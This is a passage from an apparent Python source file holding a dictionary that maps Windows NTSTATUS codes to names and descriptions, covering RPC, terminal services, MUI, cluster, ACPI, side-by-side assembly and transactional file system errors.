		0xC002002A: ("RPC_NT_UNKNOWN_AUTHN_TYPE","The authentication type is unknown."),
		0xC002002B: ("RPC_NT_MAX_CALLS_TOO_SMALL","The maximum number of calls is too small."),
		0xC002002C: ("RPC_NT_STRING_TOO_LONG","The string is too long."),
		0xC002002D: ("RPC_NT_PROTSEQ_NOT_FOUND","The RPC protocol sequence was not found."),
		0xC002002E: ("RPC_NT_PROCNUM_OUT_OF_RANGE","The procedure number is out of range."),
		0xC002002F: ("RPC_NT_BINDING_HAS_NO_AUTH","The binding does not contain any authentication information."),
		0xC0020030: ("RPC_NT_UNKNOWN_AUTHN_SERVICE","The authentication service is unknown."),
		0xC0020031: ("RPC_NT_UNKNOWN_AUTHN_LEVEL","The authentication level is unknown."),
		0xC0020032: ("RPC_NT_INVALID_AUTH_IDENTITY","The security context is invalid."),
		0xC0020033: ("RPC_NT_UNKNOWN_AUTHZ_SERVICE","The authorization service is unknown."),
		0xC0020034: ("EPT_NT_INVALID_ENTRY","The entry is invalid."),
		0xC0020035: ("EPT_NT_CANT_PERFORM_OP","The operation cannot be performed."),
		0xC0020036: ("EPT_NT_NOT_REGISTERED","No more endpoints are available from the endpoint mapper."),
		0xC0020037: ("RPC_NT_NOTHING_TO_EXPORT","No interfaces have been exported."),
		0xC0020038: ("RPC_NT_INCOMPLETE_NAME","The entry name is incomplete."),
		0xC0020039: ("RPC_NT_INVALID_VERS_OPTION","The version option is invalid."),
		0xC002003A: ("RPC_NT_NO_MORE_MEMBERS","There are no more members."),
		0xC002003B: ("RPC_NT_NOT_ALL_OBJS_UNEXPORTED","There is nothing to unexport."),
		0xC002003C: ("RPC_NT_INTERFACE_NOT_FOUND","The interface was not found."),
		0xC002003D: ("RPC_NT_ENTRY_ALREADY_EXISTS","The entry already exists."),
		0xC002003E: ("RPC_NT_ENTRY_NOT_FOUND","The entry was not found."),
		0xC002003F: ("RPC_NT_NAME_SERVICE_UNAVAILABLE","The name service is unavailable."),
		0xC0020040: ("RPC_NT_INVALID_NAF_ID","The network address family is invalid."),
		0xC0020041: ("RPC_NT_CANNOT_SUPPORT","The requested operation is not supported."),
		0xC0020042: ("RPC_NT_NO_CONTEXT_AVAILABLE","No security context is available to allow impersonation."),
		0xC0020043: ("RPC_NT_INTERNAL_ERROR","An internal error occurred in the RPC."),
		0xC0020044: ("RPC_NT_ZERO_DIVIDE","The RPC server attempted to divide an integer by zero."),
		0xC0020045: ("RPC_NT_ADDRESS_ERROR","An addressing error occurred in the RPC server."),
		0xC0020046: ("RPC_NT_FP_DIV_ZERO","A floating point operation at the RPC server caused a divide by zero."),
		0xC0020047: ("RPC_NT_FP_UNDERFLOW","A floating point underflow occurred at the RPC server."),
		0xC0020048: ("RPC_NT_FP_OVERFLOW","A floating point overflow occurred at the RPC server."),
		0xC0020049: ("RPC_NT_CALL_IN_PROGRESS","An RPC is already in progress for this thread."),
		0xC002004A: ("RPC_NT_NO_MORE_BINDINGS","There are no more bindings."),
		0xC002004B: ("RPC_NT_GROUP_MEMBER_NOT_FOUND","The group member was not found."),
		0xC002004C: ("EPT_NT_CANT_CREATE","The endpoint mapper database entry could not be created."),
		0xC002004D: ("RPC_NT_INVALID_OBJECT","The object UUID is the nil UUID."),
		0xC002004F: ("RPC_NT_NO_INTERFACES","No interfaces have been registered."),
		0xC0020050: ("RPC_NT_CALL_CANCELLED","The RPC was canceled."),
		0xC0020051: ("RPC_NT_BINDING_INCOMPLETE","The binding handle does not contain all the required information."),
		0xC0020052: ("RPC_NT_COMM_FAILURE","A communications failure occurred during an RPC."),
		0xC0020053: ("RPC_NT_UNSUPPORTED_AUTHN_LEVEL","The requested authentication level is not supported."),
		0xC0020054: ("RPC_NT_NO_PRINC_NAME","No principal name was registered."),
		0xC0020055: ("RPC_NT_NOT_RPC_ERROR","The error specified is not a valid Windows RPC error code."),
		0xC0020057: ("RPC_NT_SEC_PKG_ERROR","A security package-specific error occurred."),
		0xC0020058: ("RPC_NT_NOT_CANCELLED","The thread was not canceled."),
		0xC0020062: ("RPC_NT_INVALID_ASYNC_HANDLE","Invalid asynchronous RPC handle."),
		0xC0020063: ("RPC_NT_INVALID_ASYNC_CALL","Invalid asynchronous RPC call handle for this operation."),
		0xC0020064: ("RPC_NT_PROXY_ACCESS_DENIED","Access to the HTTP proxy is denied."),
		0xC0021007: ("RPC_P_RECEIVE_ALERTED","No description"),
		0xC0021008: ("RPC_P_CONNECTION_CLOSED","No description"),
		0xC0021009: ("RPC_P_RECEIVE_FAILED","No description"),
		0xC002100A: ("RPC_P_SEND_FAILED","No description"),
		0xC002100B: ("RPC_P_TIMEOUT","No description"),
		0xC002100C: ("RPC_P_SERVER_TRANSPORT_ERROR","No description"),
		0xC002100E: ("RPC_P_EXCEPTION_OCCURED","No description"),
		0xC0021012: ("RPC_P_CONNECTION_SHUTDOWN","No description"),
		0xC0021015: ("RPC_P_THREAD_LISTENING","No description"),
		0xC0030001: ("RPC_NT_NO_MORE_ENTRIES","The list of RPC servers available for auto-handle binding has been exhausted."),
		0xC0030002: ("RPC_NT_SS_CHAR_TRANS_OPEN_FAIL","The file designated by DCERPCCHARTRANS cannot be opened."),
		0xC0030003: ("RPC_NT_SS_CHAR_TRANS_SHORT_FILE","The file containing the character translation table has fewer than 512 bytes."),
		0xC0030004: ("RPC_NT_SS_IN_NULL_CONTEXT","A null context handle is passed as an [in] parameter."),
		0xC0030005: ("RPC_NT_SS_CONTEXT_MISMATCH","The context handle does not match any known context handles."),
		0xC0030006: ("RPC_NT_SS_CONTEXT_DAMAGED","The context handle changed during a call."),
		0xC0030007: ("RPC_NT_SS_HANDLES_MISMATCH","The binding handles passed to an RPC do not match."),
		0xC0030008: ("RPC_NT_SS_CANNOT_GET_CALL_HANDLE","The stub is unable to get the call handle."),
		0xC0030009: ("RPC_NT_NULL_REF_POINTER","A null reference pointer was passed to the stub."),
		0xC003000A: ("RPC_NT_ENUM_VALUE_OUT_OF_RANGE","The enumeration value is out of range."),
		0xC003000B: ("RPC_NT_BYTE_COUNT_TOO_SMALL","The byte count is too small."),
		0xC003000C: ("RPC_NT_BAD_STUB_DATA","The stub received bad data."),
		0xC0030059: ("RPC_NT_INVALID_ES_ACTION","Invalid operation on the encoding/decoding handle."),
		0xC003005A: ("RPC_NT_WRONG_ES_VERSION","Incompatible version of the serializing package."),
		0xC003005B: ("RPC_NT_WRONG_STUB_VERSION","Incompatible version of the RPC stub."),
		0xC003005C: ("RPC_NT_INVALID_PIPE_OBJECT","The RPC pipe object is invalid or corrupt."),
		0xC003005D: ("RPC_NT_INVALID_PIPE_OPERATION","An invalid operation was attempted on an RPC pipe object."),
		0xC003005E: ("RPC_NT_WRONG_PIPE_VERSION","Unsupported RPC pipe version."),
		0xC003005F: ("RPC_NT_PIPE_CLOSED","The RPC pipe object has already been closed."),
		0xC0030060: ("RPC_NT_PIPE_DISCIPLINE_ERROR","The RPC call completed before all pipes were processed."),
		0xC0030061: ("RPC_NT_PIPE_EMPTY","No more data is available from the RPC pipe."),
		0xC0040035: ("STATUS_PNP_BAD_MPS_TABLE","A device is missing in the system BIOS MPS table. This device will not be used. Contact your system vendor for a system BIOS update."),
		0xC0040036: ("STATUS_PNP_TRANSLATION_FAILED","A translator failed to translate resources."),
		0xC0040037: ("STATUS_PNP_IRQ_TRANSLATION_FAILED","An IRQ translator failed to translate resources."),
		0xC0040038: ("STATUS_PNP_INVALID_ID","Driver %2 returned an invalid ID for a child device (%3)."),
		0xC0040039: ("STATUS_IO_REISSUE_AS_CACHED","Reissue the given operation as a cached I/O operation"),
		0xC00A0001: ("STATUS_CTX_WINSTATION_NAME_INVALID","Session name %1 is invalid."),
		0xC00A0002: ("STATUS_CTX_INVALID_PD","The protocol driver %1 is invalid."),
		0xC00A0003: ("STATUS_CTX_PD_NOT_FOUND","The protocol driver %1 was not found in the system path."),
		0xC00A0006: ("STATUS_CTX_CLOSE_PENDING","A close operation is pending on the terminal connection."),
		0xC00A0007: ("STATUS_CTX_NO_OUTBUF","No free output buffers are available."),
		0xC00A0008: ("STATUS_CTX_MODEM_INF_NOT_FOUND","The MODEM.INF file was not found."),
		0xC00A0009: ("STATUS_CTX_INVALID_MODEMNAME","The modem (%1) was not found in the MODEM.INF file."),
		0xC00A000A: ("STATUS_CTX_RESPONSE_ERROR","The modem did not accept the command sent to it. Verify that the configured modem name matches the attached modem."),
		0xC00A000B: ("STATUS_CTX_MODEM_RESPONSE_TIMEOUT","The modem did not respond to the command sent to it. Verify that the modem cable is properly attached and the modem is turned on."),
		0xC00A000C: ("STATUS_CTX_MODEM_RESPONSE_NO_CARRIER","Carrier detection has failed or the carrier has been dropped due to disconnection."),
		0xC00A000D: ("STATUS_CTX_MODEM_RESPONSE_NO_DIALTONE","A dial tone was not detected within the required time. Verify that the phone cable is properly attached and functional."),
		0xC00A000E: ("STATUS_CTX_MODEM_RESPONSE_BUSY","A busy signal was detected at a remote site on callback."),
		0xC00A000F: ("STATUS_CTX_MODEM_RESPONSE_VOICE","A voice was detected at a remote site on callback."),
		0xC00A0010: ("STATUS_CTX_TD_ERROR","Transport driver error."),
		0xC00A0012: ("STATUS_CTX_LICENSE_CLIENT_INVALID","The client you are using is not licensed to use this system. Your logon request is denied."),
		0xC00A0013: ("STATUS_CTX_LICENSE_NOT_AVAILABLE","The system has reached its licensed logon limit. Try again later."),
		0xC00A0014: ("STATUS_CTX_LICENSE_EXPIRED","The system license has expired. Your logon request is denied."),
		0xC00A0015: ("STATUS_CTX_WINSTATION_NOT_FOUND","The specified session cannot be found."),
		0xC00A0016: ("STATUS_CTX_WINSTATION_NAME_COLLISION","The specified session name is already in use."),
		0xC00A0017: ("STATUS_CTX_WINSTATION_BUSY","The requested operation cannot be completed because the terminal connection is currently processing a connect, disconnect, reset, or delete operation."),
		0xC00A0018: ("STATUS_CTX_BAD_VIDEO_MODE","An attempt has been made to connect to a session whose video mode is not supported by the current client."),
		0xC00A0022: ("STATUS_CTX_GRAPHICS_INVALID","The application attempted to enable DOS graphics mode. DOS graphics mode is not supported."),
		0xC00A0024: ("STATUS_CTX_NOT_CONSOLE","The requested operation can be performed only on the system console. This is most often the result of a driver or system DLL requiring direct console access."),
		0xC00A0026: ("STATUS_CTX_CLIENT_QUERY_TIMEOUT","The client failed to respond to the server connect message."),
		0xC00A0027: ("STATUS_CTX_CONSOLE_DISCONNECT","Disconnecting the console session is not supported."),
		0xC00A0028: ("STATUS_CTX_CONSOLE_CONNECT","Reconnecting a disconnected session to the console is not supported."),
		0xC00A002A: ("STATUS_CTX_SHADOW_DENIED","The request to control another session remotely was denied."),
		0xC00A002B: ("STATUS_CTX_WINSTATION_ACCESS_DENIED","A process has requested access to a session, but has not been granted those access rights."),
		0xC00A002E: ("STATUS_CTX_INVALID_WD","The terminal connection driver %1 is invalid."),
		0xC00A002F: ("STATUS_CTX_WD_NOT_FOUND","The terminal connection driver %1 was not found in the system path."),
		0xC00A0030: ("STATUS_CTX_SHADOW_INVALID","The requested session cannot be controlled remotely. You cannot control your own session, a session that is trying to control your session, a session that has no user logged on, or other sessions from the console."),
		0xC00A0031: ("STATUS_CTX_SHADOW_DISABLED","The requested session is not configured to allow remote control."),
		0xC00A0032: ("STATUS_RDP_PROTOCOL_ERROR","The RDP protocol component %2 detected an error in the protocol stream and has disconnected the client."),
		0xC00A0033: ("STATUS_CTX_CLIENT_LICENSE_NOT_SET","Your request to connect to this terminal server has been rejected. Your terminal server client license number has not been entered for this copy of the terminal client. Contact your system administrator for help in entering a valid, unique license number for this terminal server client. Click OK to continue."),
		0xC00A0034: ("STATUS_CTX_CLIENT_LICENSE_IN_USE","Your request to connect to this terminal server has been rejected. Your terminal server client license number is currently being used by another user. Contact your system administrator to obtain a new copy of the terminal server client with a valid, unique license number. Click OK to continue."),
		0xC00A0035: ("STATUS_CTX_SHADOW_ENDED_BY_MODE_CHANGE","The remote control of the console was terminated because the display mode was changed. Changing the display mode in a remote control session is not supported."),
		0xC00A0036: ("STATUS_CTX_SHADOW_NOT_RUNNING","Remote control could not be terminated because the specified session is not currently being remotely controlled."),
		0xC00A0037: ("STATUS_CTX_LOGON_DISABLED","Your interactive logon privilege has been disabled. Contact your system administrator."),
		0xC00A0038: ("STATUS_CTX_SECURITY_LAYER_ERROR","The terminal server security layer detected an error in the protocol stream and has disconnected the client."),
		0xC00A0039: ("STATUS_TS_INCOMPATIBLE_SESSIONS","The target session is incompatible with the current session."),
		0xC00B0001: ("STATUS_MUI_FILE_NOT_FOUND","The resource loader failed to find an MUI file."),
		0xC00B0002: ("STATUS_MUI_INVALID_FILE","The resource loader failed to load an MUI file because the file failed to pass validation."),
		0xC00B0003: ("STATUS_MUI_INVALID_RC_CONFIG","The RC manifest is corrupted with garbage data, is an unsupported version, or is missing a required item."),
		0xC00B0004: ("STATUS_MUI_INVALID_LOCALE_NAME","The RC manifest has an invalid culture name."),
		0xC00B0005: ("STATUS_MUI_INVALID_ULTIMATEFALLBACK_NAME","The RC manifest has and invalid ultimate fallback name."),
		0xC00B0006: ("STATUS_MUI_FILE_NOT_LOADED","The resource loader cache does not have a loaded MUI entry."),
		0xC00B0007: ("STATUS_RESOURCE_ENUM_USER_STOP","The user stopped resource enumeration."),
		0xC0130001: ("STATUS_CLUSTER_INVALID_NODE","The cluster node is not valid."),
		0xC0130002: ("STATUS_CLUSTER_NODE_EXISTS","The cluster node already exists."),
		0xC0130003: ("STATUS_CLUSTER_JOIN_IN_PROGRESS","A node is in the process of joining the cluster."),
		0xC0130004: ("STATUS_CLUSTER_NODE_NOT_FOUND","The cluster node was not found."),
		0xC0130005: ("STATUS_CLUSTER_LOCAL_NODE_NOT_FOUND","The cluster local node information was not found."),
		0xC0130006: ("STATUS_CLUSTER_NETWORK_EXISTS","The cluster network already exists."),
		0xC0130007: ("STATUS_CLUSTER_NETWORK_NOT_FOUND","The cluster network was not found."),
		0xC0130008: ("STATUS_CLUSTER_NETINTERFACE_EXISTS","The cluster network interface already exists."),
		0xC0130009: ("STATUS_CLUSTER_NETINTERFACE_NOT_FOUND","The cluster network interface was not found."),
		0xC013000A: ("STATUS_CLUSTER_INVALID_REQUEST","The cluster request is not valid for this object."),
		0xC013000B: ("STATUS_CLUSTER_INVALID_NETWORK_PROVIDER","The cluster network provider is not valid."),
		0xC013000C: ("STATUS_CLUSTER_NODE_DOWN","The cluster node is down."),
		0xC013000D: ("STATUS_CLUSTER_NODE_UNREACHABLE","The cluster node is not reachable."),
		0xC013000E: ("STATUS_CLUSTER_NODE_NOT_MEMBER","The cluster node is not a member of the cluster."),
		0xC013000F: ("STATUS_CLUSTER_JOIN_NOT_IN_PROGRESS","A cluster join operation is not in progress."),
		0xC0130010: ("STATUS_CLUSTER_INVALID_NETWORK","The cluster network is not valid."),
		0xC0130011: ("STATUS_CLUSTER_NO_NET_ADAPTERS","No network adapters are available."),
		0xC0130012: ("STATUS_CLUSTER_NODE_UP","The cluster node is up."),
		0xC0130013: ("STATUS_CLUSTER_NODE_PAUSED","The cluster node is paused."),
		0xC0130014: ("STATUS_CLUSTER_NODE_NOT_PAUSED","The cluster node is not paused."),
		0xC0130015: ("STATUS_CLUSTER_NO_SECURITY_CONTEXT","No cluster security context is available."),
		0xC0130016: ("STATUS_CLUSTER_NETWORK_NOT_INTERNAL","The cluster network is not configured for internal cluster communication."),
		0xC0130017: ("STATUS_CLUSTER_POISONED","The cluster node has been poisoned."),
		0xC0140001: ("STATUS_ACPI_INVALID_OPCODE","An attempt was made to run an invalid AML opcode."),
		0xC0140002: ("STATUS_ACPI_STACK_OVERFLOW","The AML interpreter stack has overflowed."),
		0xC0140003: ("STATUS_ACPI_ASSERT_FAILED","An inconsistent state has occurred."),
		0xC0140004: ("STATUS_ACPI_INVALID_INDEX","An attempt was made to access an array outside its bounds."),
		0xC0140005: ("STATUS_ACPI_INVALID_ARGUMENT","A required argument was not specified."),
		0xC0140006: ("STATUS_ACPI_FATAL","A fatal error has occurred."),
		0xC0140007: ("STATUS_ACPI_INVALID_SUPERNAME","An invalid SuperName was specified."),
		0xC0140008: ("STATUS_ACPI_INVALID_ARGTYPE","An argument with an incorrect type was specified."),
		0xC0140009: ("STATUS_ACPI_INVALID_OBJTYPE","An object with an incorrect type was specified."),
		0xC014000A: ("STATUS_ACPI_INVALID_TARGETTYPE","A target with an incorrect type was specified."),
		0xC014000B: ("STATUS_ACPI_INCORRECT_ARGUMENT_COUNT","An incorrect number of arguments was specified."),
		0xC014000C: ("STATUS_ACPI_ADDRESS_NOT_MAPPED","An address failed to translate."),
		0xC014000D: ("STATUS_ACPI_INVALID_EVENTTYPE","An incorrect event type was specified."),
		0xC014000E: ("STATUS_ACPI_HANDLER_COLLISION","A handler for the target already exists."),
		0xC014000F: ("STATUS_ACPI_INVALID_DATA","Invalid data for the target was specified."),
		0xC0140010: ("STATUS_ACPI_INVALID_REGION","An invalid region for the target was specified."),
		0xC0140011: ("STATUS_ACPI_INVALID_ACCESS_SIZE","An attempt was made to access a field outside the defined range."),
		0xC0140012: ("STATUS_ACPI_ACQUIRE_GLOBAL_LOCK","The global system lock could not be acquired."),
		0xC0140013: ("STATUS_ACPI_ALREADY_INITIALIZED","An attempt was made to reinitialize the ACPI subsystem."),
		0xC0140014: ("STATUS_ACPI_NOT_INITIALIZED","The ACPI subsystem has not been initialized."),
		0xC0140015: ("STATUS_ACPI_INVALID_MUTEX_LEVEL","An incorrect mutex was specified."),
		0xC0140016: ("STATUS_ACPI_MUTEX_NOT_OWNED","The mutex is not currently owned."),
		0xC0140017: ("STATUS_ACPI_MUTEX_NOT_OWNER","An attempt was made to access the mutex by a process that was not the owner."),
		0xC0140018: ("STATUS_ACPI_RS_ACCESS","An error occurred during an access to region space."),
		0xC0140019: ("STATUS_ACPI_INVALID_TABLE","An attempt was made to use an incorrect table."),
		0xC0140020: ("STATUS_ACPI_REG_HANDLER_FAILED","The registration of an ACPI event failed."),
		0xC0140021: ("STATUS_ACPI_POWER_REQUEST_FAILED","An ACPI power object failed to transition state."),
		0xC0150001: ("STATUS_SXS_SECTION_NOT_FOUND","The requested section is not present in the activation context."),
		0xC0150002: ("STATUS_SXS_CANT_GEN_ACTCTX","Windows was unble to process the application binding information. Refer to the system event log for further information."),
		0xC0150003: ("STATUS_SXS_INVALID_ACTCTXDATA_FORMAT","The application binding data format is invalid."),
		0xC0150004: ("STATUS_SXS_ASSEMBLY_NOT_FOUND","The referenced assembly is not installed on the system."),
		0xC0150005: ("STATUS_SXS_MANIFEST_FORMAT_ERROR","The manifest file does not begin with the required tag and format information."),
		0xC0150006: ("STATUS_SXS_MANIFEST_PARSE_ERROR","The manifest file contains one or more syntax errors."),
		0xC0150007: ("STATUS_SXS_ACTIVATION_CONTEXT_DISABLED","The application attempted to activate a disabled activation context."),
		0xC0150008: ("STATUS_SXS_KEY_NOT_FOUND","The requested lookup key was not found in any active activation context."),
		0xC0150009: ("STATUS_SXS_VERSION_CONFLICT","A component version required by the application conflicts with another component version that is already active."),
		0xC015000A: ("STATUS_SXS_WRONG_SECTION_TYPE","The type requested activation context section does not match the query API used."),
		0xC015000B: ("STATUS_SXS_THREAD_QUERIES_DISABLED","Lack of system resources has required isolated activation to be disabled for the current thread of execution."),
		0xC015000C: ("STATUS_SXS_ASSEMBLY_MISSING","The referenced assembly could not be found."),
		0xC015000E: ("STATUS_SXS_PROCESS_DEFAULT_ALREADY_SET","An attempt to set the process default activation context failed because the process default activation context was already set."),
		0xC015000F: ("STATUS_SXS_EARLY_DEACTIVATION","The activation context being deactivated is not the most recently activated one."),
		0xC0150010: ("STATUS_SXS_INVALID_DEACTIVATION","The activation context being deactivated is not active for the current thread of execution."),
		0xC0150011: ("STATUS_SXS_MULTIPLE_DEACTIVATION","The activation context being deactivated has already been deactivated."),
		0xC0150012: ("STATUS_SXS_SYSTEM_DEFAULT_ACTIVATION_CONTEXT_EMPTY","The activation context of the system default assembly could not be generated."),
		0xC0150013: ("STATUS_SXS_PROCESS_TERMINATION_REQUESTED","A component used by the isolation facility has requested that the process be terminated."),
		0xC0150014: ("STATUS_SXS_CORRUPT_ACTIVATION_STACK","The activation context activation stack for the running thread of execution is corrupt."),
		0xC0150015: ("STATUS_SXS_CORRUPTION","The application isolation metadata for this process or thread has become corrupt."),
		0xC0150016: ("STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_VALUE","The value of an attribute in an identity is not within the legal range."),
		0xC0150017: ("STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_NAME","The name of an attribute in an identity is not within the legal range."),
		0xC0150018: ("STATUS_SXS_IDENTITY_DUPLICATE_ATTRIBUTE","An identity contains two definitions for the same attribute."),
		0xC0150019: ("STATUS_SXS_IDENTITY_PARSE_ERROR","The identity string is malformed. This may be due to a trailing comma, more than two unnamed attributes, a missing attribute name, or a missing attribute value."),
		0xC015001A: ("STATUS_SXS_COMPONENT_STORE_CORRUPT","The component store has become corrupted."),
		0xC015001B: ("STATUS_SXS_FILE_HASH_MISMATCH","A component's file does not match the verification information present in the component manifest."),
		0xC015001C: ("STATUS_SXS_MANIFEST_IDENTITY_SAME_BUT_CONTENTS_DIFFERENT","The identities of the manifests are identical, but their contents are different."),
		0xC015001D: ("STATUS_SXS_IDENTITIES_DIFFERENT","The component identities are different."),
		0xC015001E: ("STATUS_SXS_ASSEMBLY_IS_NOT_A_DEPLOYMENT","The assembly is not a deployment."),
		0xC015001F: ("STATUS_SXS_FILE_NOT_PART_OF_ASSEMBLY","The file is not a part of the assembly."),
		0xC0150020: ("STATUS_ADVANCED_INSTALLER_FAILED","An advanced installer failed during setup or servicing."),
		0xC0150021: ("STATUS_XML_ENCODING_MISMATCH","The character encoding in the XML declaration did not match the encoding used in the document."),
		0xC0150022: ("STATUS_SXS_MANIFEST_TOO_BIG","The size of the manifest exceeds the maximum allowed."),
		0xC0150023: ("STATUS_SXS_SETTING_NOT_REGISTERED","The setting is not registered."),
		0xC0150024: ("STATUS_SXS_TRANSACTION_CLOSURE_INCOMPLETE","One or more required transaction members are not present."),
		0xC0150025: ("STATUS_SMI_PRIMITIVE_INSTALLER_FAILED","The SMI primitive installer failed during setup or servicing."),
		0xC0150026: ("STATUS_GENERIC_COMMAND_FAILED","A generic command executable returned a result that indicates failure."),
		0xC0150027: ("STATUS_SXS_FILE_HASH_MISSING","A component is missing file verification information in its manifest."),
		0xC0190001: ("STATUS_TRANSACTIONAL_CONFLICT","The function attempted to use a name that is reserved for use by another transaction."),
		0xC0190002: ("STATUS_INVALID_TRANSACTION","The transaction handle associated with this operation is invalid."),
		0xC0190003: ("STATUS_TRANSACTION_NOT_ACTIVE","The requested operation was made in the context of a transaction that is no longer active."),
		0xC0190004: ("STATUS_TM_INITIALIZATION_FAILED","The transaction manager was unable to be successfully initialized. Transacted operations are not supported."),
		0xC0190005: ("STATUS_RM_NOT_ACTIVE","Transaction support within the specified file system resource manager was not started or was shut down due to an error."),
		0xC0190006: ("STATUS_RM_METADATA_CORRUPT","The metadata of the resource manager has been corrupted. The resource manager will not function."),
		0xC0190007: ("STATUS_TRANSACTION_NOT_JOINED","The resource manager attempted to prepare a transaction that it has not successfully joined."),
		0xC0190008: ("STATUS_DIRECTORY_NOT_RM","The specified directory does not contain a file system resource manager."),
		0xC019000A: ("STATUS_TRANSACTIONS_UNSUPPORTED_REMOTE","The remote server or share does not support transacted file operations."),
		0xC019000B: ("STATUS_LOG_RESIZE_INVALID_SIZE","The requested log size for the file system resource manager is invalid."),
		0xC019000C: ("STATUS_REMOTE_FILE_VERSION_MISMATCH","The remote server sent mismatching version number or Fid for a file opened with transactions."),
		0xC019000F: ("STATUS_CRM_PROTOCOL_ALREADY_EXISTS","The resource manager tried to register a protocol that already exists."),
		0xC0190010: ("STATUS_TRANSACTION_PROPAGATION_FAILED","The attempt to propagate the transaction failed."),
		0xC0190011: ("STATUS_CRM_PROTOCOL_NOT_FOUND","The requested propagation protocol was not registered as a CRM."),
		0xC0190012: ("STATUS_TRANSACTION_SUPERIOR_EXISTS","The transaction object already has a superior enlistment, and the caller attempted an operation that would have created a new superior. Only a single superior enlistment is allowed."),
		0xC0190013: ("STATUS_TRANSACTION_REQUEST_NOT_VALID","The requested operation is not valid on the transaction object in its current state."),
		0xC0190014: ("STATUS_TRANSACTION_NOT_REQUESTED","The caller has called a response API, but the response is not expected because the transaction manager did not issue the corresponding request to the caller."),
		0xC0190015: ("STATUS_TRANSACTION_ALREADY_ABORTED","It is too late to perform the requested operation, because the transaction has already been aborted."),
		0xC0190016: ("STATUS_TRANSACTION_ALREADY_COMMITTED","It is too late to perform the requested operation, because the transaction has already been committed."),
		0xC0190017: ("STATUS_TRANSACTION_INVALID_MARSHALL_BUFFER","The buffer passed in to NtPushTransaction or NtPullTransaction is not in a valid format."),
		0xC0190018: ("STATUS_CURRENT_TRANSACTION_NOT_VALID","The current transaction context associated with the thread is not a valid handle to a transaction object."),
		0xC0190019: ("STATUS_LOG_GROWTH_FAILED","An attempt to create space in the transactional resource manager's log failed. The failure status has been recorded in the event log."),
		0xC0190021: ("STATUS_OBJECT_NO_LONGER_EXISTS","The object (file, stream, or link) that corresponds to the handle has been deleted by a transaction savepoint rollback."),
		0xC0190022: ("STATUS_STREAM_MINIVERSION_NOT_FOUND","The specified file miniversion was not found for this transacted file open."),
		0xC0190023: ("STATUS_STREAM_MINIVERSION_NOT_VALID","The specified file miniversion was found but has been invalidated. The most likely cause is a transaction savepoint rollback."),
		0xC0190024: ("STATUS_MINIVERSION_INACCESSIBLE_FROM_SPECIFIED_TRANSACTION","A miniversion may be opened only in the context of the transaction that created it."),
		0xC0190025: ("STATUS_CANT_OPEN_MINIVERSION_WITH_MODIFY_INTENT","It is not possible to open a miniversion with modify access."),
		0xC0190026: ("STATUS_CANT_CREATE_MORE_STREAM_MINIVERSIONS","It is not possible to create any more miniversions for this stream."),
		0xC0190028: ("STATUS_HANDLE_NO_LONGER_VALID","The handle has been invalidated by a transaction. The most likely cause is the presence of memory mapping on a file or an open handle when the transaction ended or rolled back to savepoint."),
		0xC0190030: ("STATUS_LOG_CORRUPTION_DETECTED","The log data is corrupt."),
		0xC0190032: ("STATUS_RM_DISCONNECTED","The transaction outcome is unavailable because the resource manager responsible for it is disconnected."),
		0xC0190033: ("STATUS_ENLISTMENT_NOT_SUPERIOR","The request was rejected because the enlistment in question is not a superior enlistment."),
		0xC0190036: ("STATUS_FILE_IDENTITY_NOT_PERSISTENT","The file cannot be opened in a transaction because its identity depends on the outcome of an unresolved transaction."),
		0xC0190037: ("STATUS_CANT_BREAK_TRANSACTIONAL_DEPENDENCY","The operation cannot be performed because another transaction is depending on this property not changing."),
		0xC0190038: ("STATUS_CANT_CROSS_RM_BOUNDARY","The operation would involve a single file with two transactional resource managers and is, therefore, not allowed."),
		0xC0190039: ("STATUS_TXF_DIR_NOT_EMPTY","The $Txf directory must be empty for this operation to succeed."),
		0xC019003A: ("STATUS_INDOUBT_TRANSACTIONS_EXIST","The operation would leave a transactional resource manager in an inconsistent state and is therefore not allowed."),
		0xC019003B: ("STATUS_TM_VOLATILE","The operation could not be completed because the transaction manager does not have a log."),
		0xC019003C: ("STATUS_ROLLBACK_TIMER_EXPIRED","A rollback could not be scheduled because a previously scheduled rollback has already executed or been queued for execution."),
		0xC019003D: ("STATUS_TXF_ATTRIBUTE_CORRUPT","The transactional metadata attribute on the file or directory %hs is corrupt and unreadable."),
		0xC019003E: ("STATUS_EFS_NOT_ALLOWED_IN_TRANSACTION","The encryption operation could not be completed because a transaction is active."),
		0xC019003F: ("STATUS_TRANSACTIONAL_OPEN_NOT_ALLOWED","This object is not allowed to be opened in a transaction."),
		0xC0190040: ("STATUS_TRANSACTED_MAPPING_UNSUPPORTED_REMOTE","Memory mapping (creating a mapped section) a remote file under a transaction is not supported."),
		0xC0190043: ("STATUS_TRANSACTION_REQUIRED_PROMOTION","Promotion was required to allow the resource manager to enlist, but the transaction was set to disallow it."),
		0xC0190044: ("STATUS_CANNOT_EXECUTE_FILE_IN_TRANSACTION","This file is open for modification in an unresolved transaction and may be opened for execute only by a transacted reader."),
		0xC0190045: ("STATUS_TRANSACTIONS_NOT_FROZEN","The request to thaw frozen transactions was ignored because transactions were not previously frozen."),
		0xC0190046: ("STATUS_TRANSACTION_FREEZE_IN_PROGRESS","Transactions cannot be frozen because a freeze is already in progress."),
		0xC0190047: ("STATUS_NOT_SNAPSHOT_VOLUME","The target volume is not a snapshot volume. This operation is valid only on a volume mounted as a snapshot."),
		0xC0190048: ("STATUS_NO_SAVEPOINT_WITH_OPEN_FILES","The savepoint operation failed because files are open on the transaction, which is not permitted."),
		0xC0190049: ("STATUS_SPARSE_NOT_ALLOWED_IN_TRANSACTION","The sparse operation could not be completed because a transaction is active on the file."),
		0xC019004A: ("STATUS_TM_IDENTITY_MISMATCH","The call to create a transaction manager object failed because the Tm Identity that is stored in the log file does not match the Tm Identity that was passed in as an argument."),
		0xC019004B: ("STATUS_FLOATED_SECTION","I/O was attempted on a section object that has been floated as a result of a transaction ending. There is no valid data."),
		0xC019004C: ("STATUS_CANNOT_ACCEPT_TRANSACTED_WORK","The transactional resource manager cannot currently accept transacted work due to a transient condition, such as low resources."),
		0xC019004D: ("STATUS_CANNOT_ABORT_TRANSACTIONS","The transactional resource manager had too many transactions outstanding that could not be aborted. The transactional resource manager has been shut down."),
		0xC019004E: ("STATUS_TRANSACTION_NOT_FOUND","The specified transaction was unable to be opened because it was not found."),
		0xC019004F: ("STATUS_RESOURCEMANAGER_NOT_FOUND","The specified resource manager was unable to be opened because it was not found."),
		0xC0190050: ("STATUS_ENLISTMENT_NOT_FOUND","The specified enlistment was unable to be opened because it was not found."),
